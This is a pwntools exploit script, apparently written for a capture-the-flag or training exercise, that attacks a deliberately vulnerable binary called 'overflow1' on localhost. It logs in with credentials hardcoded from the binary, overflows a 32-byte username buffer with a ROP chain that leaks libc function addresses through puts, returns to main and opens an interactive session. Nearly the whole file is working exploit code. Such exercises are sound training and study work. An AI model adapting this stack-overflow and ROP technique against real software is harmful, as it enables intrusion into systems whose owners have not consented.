#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14003 --libc ../../libc.so.6 ../src/overflow1
from pwn import *
from pwnlib.tubes import buffer

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/overflow1.debug")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14003)
libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b *main+305
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes


def leave_prog(io: connect | process):
    # assumes starting from "> "
    io.sendline(b"3")


def change_username(io: connect | process, payload: bytes):
    # assumes starting from "> "
    io.sendline(b"1")
    io.recvuntil(b"name: ")
    io.sendline(payload)
    io.recvuntil(b"> ")


io = start()

# logging
io.info("Getting the host flag via. buffer overflow.")

# from the binary
target_user = "cristina33"
target_pass = "01843101"
login_user = "hoover95"
login_pass = "7123308"

# user_t struct size
buffer_size = 32
struct_size = buffer_size * 2

# logging in
io.recvuntil(b"name: ")
io.sendline(login_user.encode("ascii"))
io.recvuntil(b"code: ")
io.sendline(login_pass.encode("ascii"))

# function imports
syms = ["puts", "printf", "memcpy", "fgets", "exit"]

# creating a rop chain
rop = ROP(exe)
for sym in syms:
    rop.puts(exe.got[sym])
rop.main()

payload = b"A" * (buffer_size + 8) # for rbp
payload += rop.chain()

# sending it
io.info(f"Leaking function addresses.")
io.info(rop.dump())
change_username(io, payload)

# activating the rop chain
leave_prog(io)

io.interactive()
